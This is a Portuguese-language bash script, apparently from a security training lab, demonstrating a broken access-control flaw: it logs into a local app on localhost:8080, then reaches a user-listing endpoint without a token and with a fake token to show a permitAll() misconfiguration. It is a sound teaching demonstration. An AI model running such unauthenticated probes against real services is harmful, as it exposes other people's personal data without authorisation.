#!/bin/bash

# Script para demonstrar configuração insegura de endpoints
# ⚠️  APENAS PARA FINS EDUCATIVOS ⚠️

echo "========================================"
echo "VULNERABILIDADE: ENDPOINTS SEM PROTEÇÃO"
echo "========================================"
echo

BASE_URL="http://localhost:8080"

echo "🔴 DEMONSTRAÇÃO: Endpoints configurados com permitAll()"
echo "Explorando falhas na configuração de segurança"
echo


# 1. Login legítimo para obter token de referência
echo "1️⃣  Obtendo token JWT legítimo (para comparação)"
echo "-----------------------------------------------"
echo "Endpoint: POST /api/auth/login"
echo "Descrição: Login normal para obter token de referência"
echo

LOGIN_RESPONSE=$(curl -s -X POST "$BASE_URL/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"cpf":"12345678901","senha":"senha123"}')

echo "Comando:"
echo "curl -X POST '$BASE_URL/api/auth/login' -H 'Content-Type: application/json' -d '{\"cpf\":\"12345678901\",\"senha\":\"senha123\"}'"
echo
echo "Resposta:"
echo "$LOGIN_RESPONSE" | jq . 2>/dev/null || echo "$LOGIN_RESPONSE"
echo

TOKEN=$(echo "$LOGIN_RESPONSE" | jq -r '.token' 2>/dev/null || echo "")

if [ "$TOKEN" != "" ] && [ "$TOKEN" != "null" ]; then
    echo "✅ Token legítimo obtido para referência"
    echo

    # 2. Demonstrar que endpoint funciona SEM autenticação
    echo "2️⃣  VULNERABILIDADE: Endpoint sem autenticação"
    echo "----------------------------------------------"
    echo "Endpoint: GET /api/usuarios/listar"
    echo "Descrição: Endpoint configurado com permitAll() - não exige autenticação"
    echo "Problema: .antMatchers(\"/api/usuarios/**\").permitAll() no SecurityConfig.java"
    echo

    echo "Teste 1 - Acessando SEM token:"
    echo "Comando: curl -s '$BASE_URL/api/usuarios/listar'"
    NO_TOKEN_RESPONSE=$(curl -s "$BASE_URL/api/usuarios/listar")
    echo "Resposta:"
    echo "$NO_TOKEN_RESPONSE" | jq . 2>/dev/null || echo "$NO_TOKEN_RESPONSE"
    echo

    if echo "$NO_TOKEN_RESPONSE" | grep -q "error\|Unauthorized\|403\|401"; then
        echo "✅ Endpoint está protegido"
    else
        echo "💥 VULNERABILIDADE CONFIRMADA:"
        echo "• Endpoint acessível sem qualquer autenticação"
        echo "• Expõe dados sensíveis de usuários"
        echo "• Configuração incorreta: permitAll() em endpoint sensível"
        echo

        echo "Teste 2 - Acessando com token falso (para provar que não importa):"
        echo "Comando: curl -s '$BASE_URL/api/usuarios/listar' -H 'Authorization: Bearer token_falso'"
        FAKE_TOKEN_RESPONSE=$(curl -s "$BASE_URL/api/usuarios/listar" \
          -H "Authorization: Bearer token_totalmente_falso")
        echo "Resposta:"
        echo "$FAKE_TOKEN_RESPONSE" | jq . 2>/dev/null || echo "$FAKE_TOKEN_RESPONSE"
        echo "✅ PROVA: Funciona com token falso também! O endpoint ignora qualquer autenticação."
    fi
    echo

else
    echo "❌ Erro ao obter token de login"
    echo "Verifique se a aplicação está rodando em $BASE_URL"
    exit 1
fi


echo "========================================"
echo "ENDPOINTS SEM PROTEÇÃO - DEMONSTRAÇÃO"
echo "========================================"